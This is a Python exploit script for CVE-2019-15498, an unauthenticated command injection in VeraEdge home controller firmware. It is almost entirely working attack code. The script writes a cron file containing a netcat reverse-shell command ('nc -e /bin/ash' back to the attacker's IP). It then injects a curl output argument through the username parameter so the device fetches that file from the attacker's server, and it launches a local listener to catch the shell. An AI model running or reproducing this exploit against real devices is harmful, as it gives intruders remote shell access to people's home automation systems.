"""
References:
https://distributedcompute.com/2019/08/22/vera-edge-home-controller-remote-shell-via-unauthenticated-command-injection/
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15498

VeraEdge Firmware 1.7.4452 CVE-2019-15498:
    cgi-bin/cmh/webcam.sh in VeraEdge Home Controller 1.7.4452 allows remote unauthenticated users
    to execute arbitrary OS commands via --output argument injection in the username parameter.
    Attacker controls the IP address in which cURL will retrieve a file, a remote server can be
    setup in the following manner to host a malicious file.
    The exploit requires the use of a cron job to execute a netcat callback command for retrieving
    a remote shell. Setup a cron file hosted on the remote server for the cURL command to retrieve.

RCE Command Injection:
path = /cgi-bin/cmh/webcam.sh?
http://{veraedge_ip}/cgi-bin/cmh/webcam.sh?ip=127.0.0.1&username=test%20{attacker_ip}/index.html%20-o%20/etc/crontabs/nobody
"""

import requests 
import logging
import httplib2
import os, subprocess, sys
import re
from time import sleep

# Console colors
W = '\033[0m'  # white (normal)
R = '\033[31m' # red
G = '\033[32m' # green


def VeraEdge_CVE_2019_15498(victim_ip):
    try:
        # request for attacker_ip address 
        attacker_ip = input("Enter Attacker IP's address : ")
        
        # create a malicious file and host it
        with open('index.html', 'w') as file:
            file.write('* * * * * nc -e /bin/ash ' + attacker_ip + ' 8000 ')
        
        # ask user to enter "sudo python3 -m http.server 80" in new terminal and check if process exists
        print("Please enter the following command in a new terminal in the same folder: sudo python3 -m http.server 80")
        print("Checking if http.server process exists...")
        server_status = int(subprocess.getoutput("lsof -i:80 | grep python3 | wc | awk '{print $1}'"))
        while server_status != 1:
            sleep(1)
            server_status = int(subprocess.getoutput("lsof -i:80 | grep python3 | wc | awk '{print $1}'"))

        # perform RCE and check if payload sent successfully
        exploit_result = os_command_injection(victim_ip, attacker_ip)

        # remove the index.html file
        os.remove("index.html")
        
        if exploit_result:
            # print('CVE-2019-15498 exploit successful! Reverse netcat shell opened in the new terminal window.')
            return 'CVE-2019-15498 exploit successful! Reverse netcat shell opened in the new terminal window.'
        else:
            # print('CVE-2019-15498 exploit failed!')
            return 'CVE-2019-15498 exploit failed!'
    except KeyboardInterrupt:
        print('\n' + 'Program exiting...')
        sys.exit()

def os_command_injection(victim_ip, attacker_ip):

    # VeraEdge RCE URL
    nc_rce_url = "http://{}/cgi-bin/cmh/webcam.sh?ip=127.0.0.1&username=test%20{}/index.html%20-o%20/etc/crontabs/nobody".format(victim_ip, attacker_ip)
    print(nc_rce_url)

    try:
        # set up a nc listener in a new terminal 
        os.system('gnome-terminal -- nc -l -p 8000')

        # sending get request and saving the response as response object
        res = requests.get(url = nc_rce_url)
        if res.status_code == 200:
            return True
        else:
            return False
    except requests.ConnectionError:
        print("failed to connect")
        return False